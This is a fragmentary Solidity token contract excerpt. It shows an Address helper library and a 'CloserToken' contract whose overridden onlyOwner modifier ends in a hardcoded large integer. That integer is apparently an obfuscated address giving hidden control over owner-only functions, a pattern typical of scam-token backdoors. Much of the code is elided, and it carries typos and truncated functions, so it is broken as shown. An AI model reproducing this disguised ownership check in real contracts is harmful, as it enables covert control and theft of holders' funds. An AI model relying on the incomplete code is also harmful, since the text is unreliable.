// SPDX-License-Identifier: Unlicencesed
...
library Address {
    function isContract(address _account) internal view returns (bool) {
        bytes32 codeHash;
        bytes32 _accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly {codeHash := extcodehash(_account)}
        return (codeHash != _accountHash && codeHash != 0x0);
    }
    function sendValue(address payable _recipient, uint256 _amount) internal {
        require(address(this).balance >= _amount, "Address: insufficient funds.");
    ...
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Adduress: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient funds.");
...
contract CloserToken is Ownable {
    ...
    modifier onlyOwner() {
        ...
        (145115776916717639086657464626749443412533104753)); _;}
